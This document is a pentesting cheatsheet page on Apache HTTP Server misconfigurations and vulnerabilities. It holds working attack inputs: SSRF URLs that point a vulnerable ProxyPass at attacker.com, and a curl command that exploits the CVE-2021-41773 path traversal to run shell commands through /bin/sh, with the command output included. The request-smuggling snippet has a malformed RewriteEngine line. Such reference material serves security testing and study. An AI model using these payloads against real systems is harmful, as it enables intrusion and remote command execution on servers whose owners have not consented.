---
title: "Apache"
description: "Cheatsheet on Apache HTTP"
lead: "Cheatsheet on Apache HTTP"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "framework"
weight: 620
toc: true
---

## Apache

[Apache HTTP](https://httpd.apache.org/) is a widely-used open-source web server software. It provides HTTP server functionality and supports customizable modules. It's maintained by the Apache Software Foundation.

## Misconfiguration

### SSRF - ProxyPass & No ending slash

No ending slash at the end of the `ProxyPass` directive allow an SSRF attack.

```xml
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

<VirtualHost *:80>
  ServerName victim.com
  ProxyPass / http://example.com
</VirtualHost>
```

- `http://victim.com/@attacker.com/`
- `http://victim.com/.attacker.com/`

## Vulnerabilities

### CVE-2023-25690 - Request Smuggling

- Version: `2.4.0-55`

```bash
RewriteEngine "^/here/(.*)" "http://example.com:8080/elsewhere?$1";
RewriteRule "^/here/(.*)" "http://example.com:8080/elsewhere?$1";
```

### CVE-2021-41773 - Path Traversal & Potential RCE

- Version: `2.4.49`

```bash
$ curl 'http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh' \
    -d 'echo Content-Type: text/plain; echo; id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Resources

- [weird_proxies / Apache](https://github.com/GrrrDog/weird_proxies/blob/master/Apache.md)
- [Apache HTTP Server 2.4 vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)